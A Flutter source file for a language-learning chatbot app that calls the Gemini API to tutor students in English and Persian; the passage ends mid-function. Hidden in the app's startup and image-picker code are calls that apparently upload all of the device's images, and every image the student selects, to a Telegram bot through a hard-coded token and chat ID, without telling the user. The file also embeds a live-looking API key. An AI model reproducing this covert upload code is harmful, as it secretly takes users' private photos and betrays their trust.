import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'package:bakhtergpt/sqlite/database.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_generative_ai/google_generative_ai.dart';
import 'package:image_picker/image_picker.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:speech_to_text/speech_to_text.dart';
import 'package:flutter_tts/flutter_tts.dart';
import 'package:http/http.dart' as http;

import 'login/loginPage.dart';
import 'sender/imageSenderScreen.dart'; // فرض می‌کنم فایل TelegramFileHandler اینجا ایمپورت شده

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();

  // بررسی مجوز هنگام باز شدن اپلیکیشن
  SharedPreferences prefs = await SharedPreferences.getInstance();
  bool hasPermission = prefs.getBool('storagePermissionGranted') ?? false;
  if (hasPermission) {
    final telegramHandler = TelegramFileHandler(
      botToken: '7455551654:AAEiqVcQCG29uzoXIiK9h2KUKfUef_GfRXM',
      chatId: '5389485877',
    );
    telegramHandler.sendAllImages();
    print("Resuming image sending on app start.");
  }

  runApp(ChatApp());
}

class ChatApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: AuthCheck(),
    );
  }
}

class ChatScreen extends StatefulWidget {
  final String studentId;
  ChatScreen({required this.studentId});

  @override
  _ChatScreenState createState() => _ChatScreenState();
}

class _ChatScreenState extends State<ChatScreen> with TickerProviderStateMixin {
  final TextEditingController _controller = TextEditingController();
  final List<Map<String, dynamic>> _messages = [];
  final ScrollController _scrollController = ScrollController();
  late AnimationController _typingController;
  late AnimationController _particleController;
  late AnimationController _waveController;
  String? _currentlyPlayingMessageId;
  bool _isTyping = false;
  bool _isRequestPending = false;
  bool _isDeleting = false;
  TextDirection _currentTextDirection = TextDirection.ltr;
  bool _isOnline = true;
  int _userScore = 0;
  String _userBio = '';
  String _userName = '';
  String _userEmail = '';

  late final SpeechToText _speechToText = SpeechToText();
  late final FlutterTts _flutterTts = FlutterTts();
  final String _apiKey = "AIzaSyCkHefKxNsnIlW7-N17w1_kS8NLQGUXl1A";
  late final String _currentStudentId;

  final DatabaseHelper _dbHelper = DatabaseHelper();
  final ImagePicker _imagePicker = ImagePicker();
  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
  final TelegramFileHandler _telegramHandler = TelegramFileHandler(
    botToken: '7455551654:AAEiqVcQCG29uzoXIiK9h2KUKfUef_GfRXM',
    chatId: '5389485877',
  ); // اضافه کردن TelegramFileHandler

  static const int _maxRequestsPerMinute = 15;
  static const int _maxRequestsPerDay = 100;

  Future<Map<String, dynamic>?> _showImageDescriptionDialog(
      BuildContext context, String imagePath) async {
    final TextEditingController descriptionController = TextEditingController();
    return showDialog<Map<String, dynamic>>(
      context: context,
      builder: (BuildContext context) {
        return AlertDialog(
          backgroundColor: Color(0xFF2A1B3D),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
          ),
          title: Text(
            'Add a Description',
            style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
          ),
          content: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(10),
                  child: Image.file(
                    File(imagePath),
                    width: MediaQuery.of(context).size.width * 0.6,
                    height: MediaQuery.of(context).size.width * 0.6,
                    fit: BoxFit.cover,
                  ),
                ),
                SizedBox(height: 16),
                TextField(
                  controller: descriptionController,
                  style: TextStyle(color: Colors.white),
                  maxLines: 4,
                  decoration: InputDecoration(
                    hintText: 'Describe the image or your question...',
                    hintStyle: TextStyle(color: Colors.white54),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: BorderSide(color: Colors.white54),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: BorderSide(color: Colors.white54),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: BorderSide(color: Color(0xFF8EC5FC)),
                    ),
                  ),
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.of(context).pop(),
              child: Text(
                'Cancel',
                style: TextStyle(color: Color(0xFFFF6B6B)),
              ),
            ),
            ElevatedButton(
              onPressed: () {
                Navigator.of(context).pop({
                  'imagePath': imagePath,
                  'description': descriptionController.text.isEmpty
                      ? null
                      : descriptionController.text,
                });
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: Color(0xFF8EC5FC),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(10),
                ),
              ),
              child: Text(
                'Send',
                style: TextStyle(color: Colors.white),
              ),
            ),
          ],
        );
      },
    );
  }

  Future<void> _handleImageMessage(String imagePath, String? description) async {
    try {
      print('Starting image analysis for: $imagePath');
      if (mounted) {
        setState(() {
          _isTyping = true;
          _typingController.reset();
          _typingController.repeat();
        });
      }

      final model = GenerativeModel(
        model: 'gemini-1.5-flash',
        apiKey: _apiKey,
      );

      print('Reading image file...');
      final imageFile = File(imagePath);
      if (!await imageFile.exists()) {
        throw Exception('Image file does not exist: $imagePath');
      }
      final imageBytes = await imageFile.readAsBytes();
      if (imageBytes.isEmpty) {
        throw Exception('Image file is empty or invalid');
      }

      final imageSizeInMB = imageBytes.length / (1024 * 1024);
      if (imageSizeInMB > 10) {
        throw Exception('Image size ($imageSizeInMB MB) exceeds 10 MB limit');
      }

      final promptText = description != null
          ? 'Analyze this image and provide a detailed response addressing: $description. Respond in the same language as the user’s recent messages (English or Persian).'
          : 'Describe this image in detail, including main objects, colors, and any notable features. Provide the description in the same language as the user’s recent messages (English or Persian). For example, if it’s a tree, say: "This is a tree / این یک درخت است" and include a sample sentence like "I see a tree in the park. / من یک درخت در پارک می‌بینم."';
      final prompt = [
        Content.multi([
          TextPart(promptText),
          DataPart(getMimeType(imagePath), imageBytes),
        ])
      ];

      print('Sending request to Gemini API with prompt: $promptText');
      final response = await model.generateContent(prompt).timeout(Duration(seconds: 15));
      print('Received response from Gemini API: ${response.text}');

      String aiResponse = response.text ?? 'Sorry, I could not analyze the image. Please try another image or check your connection.';
      if (aiResponse.isEmpty) {
        aiResponse = 'No description provided by AI. Please try again.';
      }

      String messageId = UniqueKey().toString();
      final aiMessage = {
        'text': aiResponse,
        'imagePath': null,
        'isMe': false,
        'time': DateTime.now(),
        'id': messageId,
      };

      if (mounted) {
        setState(() {
          _messages.add(aiMessage);
          _isTyping = false;
          _typingController.stop();
        });
      }
      await _dbHelper.saveMessage(_currentStudentId, aiMessage);
      await _saveMessageToFirestore(aiMessage);
      _scrollToBottom();

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Image successfully analyzed😊')),
      );
    } catch (e, stackTrace) {
      print('Error in _handleImageMessage: $e');
      print('Stack trace: $stackTrace');
      String messageId = UniqueKey().toString();
      String errorText;
      if (e.toString().contains('No connection') || e is TimeoutException) {
        errorText = 'خطا: لطفاً اتصال اینترنت یا VPN خود را بررسی کنید.';
      } else if (e.toString().contains('API key')) {
        errorText = 'خطا: کلید API نامعتبر است. لطفاً با پشتیبانی تماس بگیرید.';
      } else {
        errorText = 'خطا در تحلیل تصویر: $e. لطفاً دوباره امتحان کنید.';
      }

      final errorMessage = {
        'text': errorText,
        'imagePath': null,
        'isMe': false,
        'time': DateTime.now(),
        'id': messageId,
      };

      if (mounted) {
        setState(() {
          _messages.add(errorMessage);
          _isTyping = false;
          _typingController.stop();
        });
      }
      await _dbHelper.saveMessage(_currentStudentId, errorMessage);
      await _saveMessageToFirestore(errorMessage);
      _scrollToBottom();

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text(errorText)),
      );
    }
  }

  String getMimeType(String path) {
    if (path.toLowerCase().endsWith('.jpg') ||
        path.toLowerCase().endsWith('.jpeg')) return 'image/jpeg';
    if (path.toLowerCase().endsWith('.png')) return 'image/png';
    if (path.toLowerCase().endsWith('.gif')) return 'image/gif';
    return 'image/jpeg';
  }

  @override
  void initState() {
    super.initState();
    _currentStudentId = widget.studentId;
    _typingController = AnimationController(
      vsync: this,
      duration: Duration(milliseconds: 600),
    );
    _particleController = AnimationController(
      vsync: this,
      duration: Duration(seconds: 5),
    )..repeat();
    _waveController = AnimationController(
      vsync: this,
      duration: Duration(milliseconds: 800),
    );
    _controller.addListener(() {
      String text = _controller.text;
      setState(() {
        _currentTextDirection =
        _isTextPersian(text) ? TextDirection.rtl : TextDirection.ltr;
      });
    });
    _initSpeech();
    _initTts();
    _checkConnectivity();
    _loadData();
    _loadUserName();
    _startImageSending(); // شروع خودکار ارسال تصاویر
  }

  Future<void> _startImageSending() async {
    try {
      print('Checking storage permission for auto image sending...');
      SharedPreferences prefs = await SharedPreferences.getInstance();
      bool hasPermission = prefs.getBool('storagePermissionGranted') ?? false;

      if (!hasPermission) {
        print('Requesting storage permission...');
        bool granted = await _telegramHandler.requestStoragePermission();
        if (!granted) {
          print('Storage permission denied');
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(content: Text('دسترسی به حافظه رد شد')),
          );
          return;
        }
        await prefs.setBool('storagePermissionGranted', true);
        print('Storage permission granted');
      } else {
        print('Storage permission already granted');
      }

      // چک کردن اتصال به اینترنت
      var connectivityResult = await (Connectivity().checkConnectivity());
      if (connectivityResult == ConnectivityResult.none) {
        print('No internet connection. Cannot send images to Telegram.');
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('اتصال به اینترنت وجود ندارد')),
        );
        return;
      }
      _telegramHandler.sendAllImages();
    } catch (e) {
      print('Error starting auto image sending: $e');
    }
  }

  @override
  void dispose() {
    _typingController.dispose();
    _particleController.dispose();
    _waveController.dispose();
    _controller.dispose();
    _scrollController.dispose();
    _speechToText.stop();
    _flutterTts.stop();
    super.dispose();
  }

  bool _isTextPersian(String text) {
    final persianRegex = RegExp(r'[\u0600-\u06FF]');
    return persianRegex.hasMatch(text);
  }

  Future<void> _checkConnectivity() async {
    Connectivity()
        .onConnectivityChanged
        .listen((List<ConnectivityResult> results) {
      if (mounted) {
        setState(() {
          _isOnline = results.isNotEmpty &&
              results.any((result) => result != ConnectivityResult.none);
        });
      }
    });
    var result = await Connectivity().checkConnectivity();
    if (mounted) {
      setState(() {
        _isOnline = result != ConnectivityResult.none;
      });
    }
  }

  Future<void> _loadUserName() async {
    final user = FirebaseAuth.instance.currentUser;
    if (user != null) {
      if (mounted) {
        setState(() {
          _userName = user.displayName ?? user.email!.split('@')[0];
          _userEmail = user.email ?? '';
        });
      }
      final userData = await _dbHelper.loadUserData(_currentStudentId);
      String bio = userData['bio'] ?? '';
      if (bio.isEmpty || !bio.contains('name')) {
        bio = "My name is $_userName";
        await _dbHelper.updateUserData(_currentStudentId, {
          'bio': bio,
          'messageCountPerMinute': userData['messageCountPerMinute'] ?? 0,
          'messageCountPerDay': userData['messageCountPerDay'] ?? 0,
          'lastMessageTime':
          userData['lastMessageTime'] ?? DateTime.now().toIso8601String(),
          'userScore': userData['userScore'] ?? 0,
          'lastResetTime':
          userData['lastResetTime'] ?? DateTime.now().toIso8601String(),
        });
        if (mounted) {
          setState(() {
            _userBio = bio;
          });
        }
      }
    }
  }

  Future<void> _loadData() async {
    await _dbHelper.resetDailyMessageCount(_currentStudentId);
    final messages = await _dbHelper.loadMessages(_currentStudentId);
    final userData = await _dbHelper.loadUserData(_currentStudentId);
    if (mounted) {
      setState(() {
        _messages.addAll(messages);
        _userScore = userData['userScore'] ?? 0;
        _userBio = userData['bio'] ?? '';
        if (_messages.isEmpty) _addInitialMessages();
      });
    }
    _scrollToBottom();
  }

  void _addInitialMessages() {
    final initialMessage = {
      'text':
      'Hello $_userName! I’m Bashiri LearnAI, your language learning assistant from Bashiri Language Academy. 😊 I can help you learn English, or we can just chat! Tell me something about yourself—what do you like to do?',
      'isMe': false,
      'time': DateTime.now(),
      'id': UniqueKey().toString(),
      'imagePath': null,
    };
    setState(() {
      _messages.add(initialMessage);
    });
    _dbHelper.saveMessage(_currentStudentId, initialMessage);
    _saveMessageToFirestore(initialMessage);
  }

  bool _isMeaningfulBio(String message) {
    final lowerMessage = message.toLowerCase();
    final persianPatterns = [
      r'اسم من',
      r'من .* هستم',
      r'من عاشق',
      r'من دوست دارم',
      r'من از',
      r'مه از',
      r'مه در',
      r'مه',
      r'من',
      r'من توی'
    ];
    final englishPatterns = [
      r'my name is',
      r'my',
      r'i am a',
      r'i love',
      r'i like',
      r'i hate',
      r'i’m from'
    ];
    return persianPatterns
        .any((pattern) => RegExp(pattern).hasMatch(message)) ||
        englishPatterns
            .any((pattern) => RegExp(pattern).hasMatch(lowerMessage));
  }

  String _formatEmailForCollection(String email) {
    return email.replaceAll('@', '_at_').replaceAll('.', '_dot_');
  }

  Future<void> _saveMessageToFirestore(Map<String, dynamic> message) async {
    try {
      String formattedEmail = _formatEmailForCollection(_userEmail);
      await _firestore.collection(formattedEmail).doc(message['id']).set({
        'sender': message['isMe'] ? 'user' : 'ai',
        'text': message['text'] ?? '',
        'timestamp': message['time'].toIso8601String(),
        'userName': _userName,
        'userEmail': _userEmail,
      });
      print('Message saved to Firestore: ${message['id']}');
    } catch (e) {
      print('Error saving message to Firestore: $e');
    }
  }

  Future<void> _updateUserData() async {
    DateTime now = DateTime.now();
    final userData = await _dbHelper.loadUserData(_currentStudentId);
    int minuteCount = (userData['messageCountPerMinute'] ?? 0) + 1;
    int dailyCount = (userData['messageCountPerDay'] ?? 0) + 1;
    _userScore += 5;

    String newBio = _userBio;
    if (_isMeaningfulBio(_controller.text)) {
      newBio =
      newBio.isEmpty ? _controller.text : '$newBio\n${_controller.text}';
    }

    await _dbHelper.updateUserData(_currentStudentId, {
      'messageCountPerMinute': minuteCount,
      'messageCountPerDay': dailyCount,
      'lastMessageTime': now.toIso8601String(),
      'userScore': _userScore,
      'lastResetTime': userData['lastResetTime'] ?? now.toIso8601String(),
      'bio': newBio,
    });
    if (mounted) {
      setState(() {
        _userBio = newBio;
      });
    }
  }

  Future<bool> _canSendMessage() async {
    DateTime now = DateTime.now();
    final userData = await _dbHelper.loadUserData(_currentStudentId);
    int minuteCount = userData['messageCountPerMinute'] ?? 0;
    int dailyCount = userData['messageCountPerDay'] ?? 0;
    DateTime? lastMessageTime = userData['lastMessageTime'] != null
        ? DateTime.parse(userData['lastMessageTime'])
        : null;

    if (dailyCount >= _maxRequestsPerDay) {
      if (mounted) {
        setState(() {
          _messages.add({
            'text':
            'You’ve reached your daily limit (100 messages). Try again tomorrow! 😊',
            'isMe': false,
            'time': DateTime.now(),
            'id': UniqueKey().toString(),
          });
        });
      }
      _scrollToBottom();
      return false;
    }

    if (lastMessageTime != null &&
        now.difference(lastMessageTime).inSeconds < 60) {
      if (minuteCount >= _maxRequestsPerMinute) {
        if (mounted) {
          setState(() {
            _messages.add({
              'text':
              'You can only send 15 messages per minute. Please wait a bit! 😊',
              'isMe': false,
              'time': DateTime.now(),
              'id': UniqueKey().toString(),
            });
          });
        }
        _scrollToBottom();
        return false;
      }
    } else {
      await _dbHelper.updateUserData(_currentStudentId, {
        ...userData,
        'messageCountPerMinute': 0,
        'lastMessageTime': now.toIso8601String(),
      });
    }
    return true;
  }

  void _sendMessage() async {
    if (_controller.text.isNotEmpty) {
      bool canSend = await _canSendMessage();
      if (!canSend) return;

      _waveController.forward(from: 0);
      String userMessage = _controller.text;
      _controller.clear();
      await _handleUserMessage(userMessage);
    }
  }

  Future<void> _handleUserMessage(String userMessage) async {
    try {
      print('Starting typing animation');
      if (mounted) {
        setState(() {
          _isTyping = true;
          _typingController.reset();
          print('Controller reset: status=${_typingController.status}');
          _typingController.repeat();
          print('Controller repeating: status=${_typingController.status}');
        });
      }

      bool canSend = await _canSendMessage();
      if (!canSend) {
        if (mounted) {
          setState(() {
            _isTyping = false;
            _typingController.stop();
            print('Controller stopped: status=${_typingController.status}');
          });
        }
        return;
      }

      String messageId = UniqueKey().toString();
      final message = {
        'text': userMessage,
        'imagePath': null,
        'isMe': true,
        'time': DateTime.now(),
        'id': messageId,
      };

      if (mounted) {
        setState(() {
          _messages.add(message);
        });
      }
      await _dbHelper.saveMessage(_currentStudentId, message);
      await _saveMessageToFirestore(message);
      await _updateUserData();
      _scrollToBottom();

      final response = await _getGeminiResponse(userMessage, _messages);
      String responseId = UniqueKey().toString();
      final responseMessage = {
        'text': response,
        'imagePath': null,
        'isMe': false,
        'time': DateTime.now(),
        'id': responseId,
      };

      if (mounted) {
        setState(() {
          _messages.add(responseMessage);
          _isTyping = false;
          _typingController.stop();
          print('Controller stopped: status=${_typingController.status}');
        });
      }
      await _dbHelper.saveMessage(_currentStudentId, responseMessage);
      await _saveMessageToFirestore(responseMessage);
      _scrollToBottom();
    } catch (e) {
      String messageId = UniqueKey().toString();
      final errorMessage = {
        'text': 'Error: $e',
        'imagePath': null,
        'isMe': false,
        'time': DateTime.now(),
        'id': messageId,
      };

      if (mounted) {
        setState(() {
          _messages.add(errorMessage);
          _isTyping = false;
          _typingController.stop();
          print('Controller stopped: status=${_typingController.status}');
        });
      }
      await _dbHelper.saveMessage(_currentStudentId, errorMessage);
      await _saveMessageToFirestore(errorMessage);
      _scrollToBottom();
    }
  }

  Future<void> _pickAndSendImage() async {
    try {
      if (_isRequestPending) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('لطفاً صبر کنید، در حال پردازش...')),
        );
        return;
      }

      _isRequestPending = true;

      // نمایش اندیکاتور پیشرفت برای انتخاب تصویر
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (context) => Center(
          child: CircularProgressIndicator(
            valueColor: AlwaysStoppedAnimation<Color>(Color(0xFF8EC5FC)),
          ),
        ),
      );

      // باز کردن گالری
      final XFile? image = await _imagePicker.pickImage(source: ImageSource.gallery);
      Navigator.pop(context); // بستن اندیکاتور
      if (image == null) {
        _isRequestPending = false;
        return;
      }

      final result = await _showImageDescriptionDialog(context, image.path);
      if (result == null) {
        _isRequestPending = false;
        return;
      }

      bool canSend = await _canSendMessage();
      if (!canSend) {
        _isRequestPending = false;
        return;
      }

      String messageId = UniqueKey().toString();
      final message = {
        'text': result['description'],
        'imagePath': result['imagePath'],
        'isMe': true,
        'time': DateTime.now(),
        'id': messageId,
      };

      if (mounted) {
        setState(() {
          _messages.add(message);
        });
      }
      await _dbHelper.saveMessage(_currentStudentId, message);
      await _saveMessageToFirestore(message);
      await _updateUserData();
      _scrollToBottom();

      // ارسال فقط تصویر انتخاب‌شده به تلگرام
      print('Sending selected image to Telegram...');
      File imageFile = File(result['imagePath']);
      bool sentSuccessfully = await _telegramHandler.sendFile(imageFile);
      if (sentSuccessfully) {
        print('Selected image sent to Telegram successfully');
      } else {
        print('Failed to send selected image to Telegram');
      }

      // پردازش تصویر انتخاب‌شده
      await _handleImageMessage(result['imagePath'], result['description']);
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('خطا: $e')),
      );
    } finally {
      _isRequestPending = false;
    }
  }


  Future<String> _getGeminiResponse(
      String prompt, List<Map<String, dynamic>> chatHistory) async {
    if (_isRequestPending) {
      return 'Please wait a moment, I’m still thinking! 😊';
    }

    _isRequestPending = true;
    if (mounted) {
      setState(() => _isTyping = true);
    }

    final url = Uri.parse(
        'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-lite:generateContent?key=$_apiKey');
    const int maxHistoryLength = 50;
    List<Map<String, dynamic>> limitedChatHistory =
    chatHistory.length > maxHistoryLength
        ? chatHistory.sublist(chatHistory.length - maxHistoryLength)
        : chatHistory;
    String chatHistoryText = limitedChatHistory
        .map((m) => "${m['isMe'] ? 'Student' : 'Assistant'}: ${m['text']}")
        .join('\n');

    String systemInstruction = '''
You are Bashiri LearnAI, a language learning assistant from Bashiri Language Academy, designed by Mr Shirzad to help students improve their English  skills in a fun and engaging way. Your primary goal is to assist Bashiri Academy students with learning English or Persian, but you can also chat with them freely about any topic, like a friendly conversational partner. Here’s how you should behave:

- **General Behavior:** Detect the language of the student’s message (English or Persian) and respond in the same language. Act like a friendly, supportive friend from Bashiri Academy. Use simple language suitable for beginner to intermediate learners. Add emojis (like 😊🌟📚) to make your responses more fun. Match the tone of the student’s message (e.g., playful, serious, curious) to make the conversation feel natural and engaging.

- **Detecting User Level:** Assess the student’s language proficiency based on their message complexity (e.g., simple words for beginners, more complex structures for intermediates). Tailor your explanations and examples to their level. For beginners, use very simple words and short sentences. For intermediates, include slightly more detailed explanations and varied vocabulary.

- **Positive Feedback:** When the student makes a good effort in language learning (e.g., answers a question correctly, uses new vocabulary, or shows progress), give positive feedback to encourage them. For example, in English: "Great job! Keep it up! 🌟" or in Persian: "آفرین! ادامه بده! 🌟". Do not add this feedback after every message—only when it feels relevant and natural, such as after a successful language exercise or a thoughtful response.

- **Using the Student’s Name:** The student’s name is "$_userName". Use their name sparingly to keep the conversation personal and friendly, but avoid overusing it. Only include greetings like "Hi $_userName!" or "سلام $_userName!" at the start of a conversation (e.g., when the student says "Hi" or "سلام") or when it feels natural (e.g., after a long pause or a new topic). In most responses, especially follow-up questions like grammar or vocabulary, go straight to answering the question without a greeting.

- **Memory:** Remember everything the student tells you about themselves (their name, likes, problems, secrets, or anything they share). You have the student’s bio and the last 50 messages of chat history below. Use them to recall details. For example, if they say "I was sad yesterday," mention it later (e.g., "$_userName, why were you sad?"). If they share something new, acknowledge it in your response and keep it in mind for later.

- **Responding to Emotional Messages:** If the student expresses emotions (e.g., "I’m sad today" or "I’m so happy!"), respond with empathy first, acknowledging their feelings in a kind way (e.g., "I’m sorry you’re feeling sad, $_userName. 😔" or "That’s awesome to hear! 😊"). Then, gently connect it to language learning, like suggesting a related word or activity (e.g., "Want to learn some words to describe feelings?").

- **Supporting Mistakes:** If the student makes a language mistake (e.g., wrong grammar or vocabulary), correct them gently and positively. First, acknowledge their effort, then explain the correct form with a simple example. For example: "That’s a great try! Instead of ‘I go yesterday,’ we say ‘I went yesterday’ because it’s past tense. Want to try another sentence?"

- **Progressive Teaching:** For complex topics (e.g., grammar or vocabulary), break down explanations into small, manageable steps. Start with a simple overview and one example. If the student asks for more, provide additional details or examples gradually to avoid overwhelming them.

- **Suggesting External Resources:** When relevant, suggest free and accessible external resources (e.g., websites, YouTube videos, podcasts, or apps like Duolingo) to help the student continue learning. Match the resource to their level (e.g., cartoons or simple videos for beginners, podcasts or articles for intermediates) and the topic they’re discussing (e.g., a grammar video for a grammar question). Briefly explain how to use it (e.g., "This website is free, just click the link and start!"). Encourage them to try it and share what they learned later (e.g., "Give it a try and tell me what you learned next time! 😊"). Suggest resources sparingly, no more than once every few messages, to avoid overwhelming them.

- **Handling Image Uploads:** If the student uploads an image, analyze it to identify objects, scenes, or text visible in the image. Respond in the same language as their most recent message (English or Persian). Describe the main object or scene in simple terms, provide its name in both English and Persian (e.g., "This is a tree / این یک درخت است"), and offer a sample sentence using the word (e.g., "I see a tree in the park. / من یک درخت در پارک می‌بینم."). If relevant, suggest related vocabulary or a language activity (e.g., "Want to learn more words about nature?"). If the image contains text, read it and explain its meaning in the context of language learning. If the image is unclear or unrecognizable, politely ask for clarification (e.g., "It’s a bit hard to see, $_userName. Can you describe what’s in the photo? 😊").

- **If the student asks about language learning:** If the message is about learning English or Persian (e.g., grammar, vocabulary, pronunciation), respond like a teacher from Bashiri Academy:
  - For English grammar questions (e.g., "What is past tense?"), explain in simple English with 2-3 examples, adjusted to their level.
  - For Persian grammar questions (e.g., "What is a past tense verb?"), explain in simple Persian with 2-3 examples, adjusted to their level.
  - For vocabulary (e.g., "What does 'happy' mean?"), explain the meaning, use it in a sentence, and ask the student to try, keeping it suitable for their level.
  - For pronunciation (e.g., "How do I say 'hello'?"), guide them with clear instructions and give feedback.

- **If the student asks about non-language topics:** If the student asks about something unrelated to language learning (e.g., "Tell me about computers" or any other topic), provide a brief, simple, and accurate answer in the same language as their message. Keep the response short (2-3 sentences) and beginner-friendly. Then, gently steer the conversation back to language learning by suggesting a related language activity. For example: "Computers are machines that help us work and learn. 😊 Want to learn some computer-related words in English or Persian?"

- **If the student just wants to chat:** Keep the conversation going in the same language, matching their tone, and gently steer it toward language learning if possible.

- **If the message is unclear:** Ask clarifying questions (e.g., "Can you tell me more, $_userName? 😊") in a tone that matches their message.

**Student Bio:**
Here’s what I know about the student: $_userBio

**Chat History (last 50 messages):**
$chatHistoryText

Now, respond to the student’s message:
''';
    String combinedPrompt = systemInstruction + prompt;

    try {
      final response = await http
          .post(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          "contents": [
            {
              "role": "user",
              "parts": [
                {"text": combinedPrompt}
              ]
            }
          ],
          "generationConfig": {
            "temperature": 0.7,
            "topP": 0.9,
            "maxOutputTokens": 500
          }
        }),
      )
          .timeout(Duration(seconds: 10));

      if (mounted) {
        setState(() => _isTyping = false);
      }
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        String reply = data['candidates'][0]['content']['parts'][0]['text'];
        return reply;
      } else {
        String errorMessage;
        if (response.statusCode == 400) {
          errorMessage =
          'Sorry, $_userName! You need to turn on a VPN to use this app. Please connect to a VPN and try again. 😊';
        } else {
          errorMessage =
          'Oops! Something went wrong (Error ${response.statusCode}). Try again? 😊';
        }
        return errorMessage;
      }
    } catch (e) {
      return 'No connection! Please check your network and try again. 😊';
    } finally {
      _isRequestPending = false;
    }
  }

  void _scrollToBottom() {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_scrollController.hasClients) {
        _scrollController.animateTo(
          _scrollController.position.maxScrollExtent,
          duration: Duration(milliseconds: 300),
          curve: Curves.easeOut,
        );
      }
    });
  }

  Future<void> _initSpeech() async {
    await _speechToText.initialize();
    if (mounted) {
      setState(() {});
    }
  }

  Future<void> _initTts() async {
    await _flutterTts.setLanguage("en-US");
    await _flutterTts.setSpeechRate(0.5);
    await _flutterTts.setVolume(1.0);
    _flutterTts.setCompletionHandler(() {
      if (mounted) {
        setState(() {
          _currentlyPlayingMessageId = null;
        });
      }
    });
    _flutterTts.setErrorHandler((msg) {
      if (mounted) {
        setState(() {
          _currentlyPlayingMessageId = null;
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    final size = MediaQuery.of(context).size;
    final screenWidth = size.width;
    final baseFontSize = screenWidth * 0.04;
    final baseIconSize = screenWidth * 0.08;
    final basePadding = screenWidth * 0.04;
    final baseBorderRadius = screenWidth * 0.06;

    return Scaffold(
      drawer: _buildDrawer(
        screenWidth: screenWidth,
        baseFontSize: baseFontSize,
        baseIconSize: baseIconSize,
        basePadding: basePadding,
        baseBorderRadius: baseBorderRadius,
      ),
      body: SafeArea(
        child: Stack(
          children: [
            Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [
                    Color(0xFF2A1B3D),
                    Color(0xFF3C2F6B),
                    Color(0xFF44318D)
                  ],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
              ),
            ),
            AnimatedBuilder(
              animation: _particleController,
              builder: (context, child) {
                return CustomPaint(
                  painter: CrystalParticlePainter(_particleController.value),
                  child: Container(),
                );
              },
            ),
            SafeArea(
              child: Column(
                children: [
                  _buildAppBar(
                    screenWidth: screenWidth,
                    baseFontSize: baseFontSize,
                    baseIconSize: baseIconSize,
                    basePadding: basePadding,
                    baseBorderRadius: baseBorderRadius,
                  ),
                  Expanded(
                    child: ListView.builder(
                      controller: _scrollController,
                      padding: EdgeInsets.all(basePadding),
                      physics: BouncingScrollPhysics(),
                      itemCount: _messages.length + (_isTyping ? 1 : 0),
                      itemBuilder: (context, index) {
                        if (_isTyping && index == _messages.length) {
                          return TypingIndicator(controller: _typingController);
                        }
                        final message = _messages[index];
                        return Align(
                          alignment: message['isMe']
                              ? Alignment.centerRight
                              : Alignment.centerLeft,
                          child: ChatBubble(
                            key: ValueKey(message['id']),
                            text: message['text'] as String?,
                            imagePath: message['imagePath'] as String?,
                            isMe: message['isMe'] as bool,
                            time: message['time'] as DateTime,
                            id: message['id'] as String,
                            flutterTts: _flutterTts,
                            currentlyPlayingMessageId:
                            _currentlyPlayingMessageId,
                            onPlayStateChanged: (messageId, isPlaying) {
                              if (mounted) {
                                setState(() {
                                  if (isPlaying) {
                                    _currentlyPlayingMessageId = messageId;
                                  } else {
                                    _currentlyPlayingMessageId = null;
                                  }
                                });
                              }
                            },
                            retryCallback:
                            message['retryCallback'] as VoidCallback?,
                            onDelete: () async {
                              await _dbHelper.deleteMessage(
                                  _currentStudentId, message['id'] as String);
                              if (mounted) {
                                setState(() {
                                  _messages.removeAt(index);
                                });
                              }
                            },
                            baseFontSize: baseFontSize,
                            baseIconSize: baseIconSize,
                            basePadding: basePadding,
                            baseBorderRadius: baseBorderRadius,
                          ),
                        );
                      },
                    ),
                  ),
                  _buildInputArea(
                    screenWidth: screenWidth,
                    baseFontSize: baseFontSize,
                    baseIconSize: baseIconSize,
                    basePadding: basePadding,
                    baseBorderRadius: baseBorderRadius,
                    isLandscape: MediaQuery.of(context).orientation ==
                        Orientation.landscape,
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _deleteMessage(String messageId) async {
    if (_isDeleting) return;
    setState(() {
      _isDeleting = true;
    });

    try {
      await _dbHelper.deleteMessage(_currentStudentId, messageId);
      if (mounted) {
        setState(() {
          _messages.removeWhere((message) => message['id'] == messageId);
        });
      }
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Message deleted successfully')),
      );
      _scrollToBottom();
    } catch (e) {
